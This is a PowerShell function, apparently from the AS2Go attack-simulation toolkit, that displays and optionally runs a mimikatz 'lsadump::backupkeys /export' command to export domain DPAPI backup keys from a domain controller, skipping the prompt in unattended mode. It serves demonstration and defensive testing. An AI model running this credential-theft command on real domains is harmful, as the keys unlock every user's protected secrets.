<#
.SYNOPSIS
Runs the domain DPAPI backup key export workflow.

.DESCRIPTION
Shows the export command and, when authorized, attempts to export DPAPI backup keys
from a domain controller in the selected domain. These keys can help recover domain
users' DPAPI master keys and decrypt the corresponding protected data.

.EXAMPLE
Invoke-DPAPIBackupKeyExport
Runs the domain DPAPI backup key export workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires domain administrator privileges and access to the DPAPI backup key store.

.COMPONENT
Category: Attack Function

.FUNCTIONALITY
Demonstrates how domain DPAPI backup key exposure can enable recovery of users' DPAPI master keys.
Shows the export command and attempts to retrieve the backup keys from a selected domain controller.
#>
function Invoke-DPAPIBackupKeyExport {

    $info = Measure-FunctionRuntime -Begin

    If (-not $SkipClearHost) { Clear-Host }
    Write-AS2GoOutput -Type Header -Message "Export Domain DPAPI Backup Keys"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    Write-AS2GoOutput -Type Bullet -Message "Domain backup keys can help recover users' DPAPI master keys and decrypt the corresponding protected data."
    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"

    Write-Highlight -Text ".\mimikatz.exe ", """cd $Script:DefautExfiltrationFolder"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$Script:ASDC.$Script:ASFQDN", " /export", """ ""exit"""  `
        -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
    Write-Host  ""

    If ($UnAttended) {
        $answer = $Script:Yes
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -eq $Script:Yes) {
        Export-DPAPIBackupKey
    }

    Measure-FunctionRuntime -End -Details $info
}
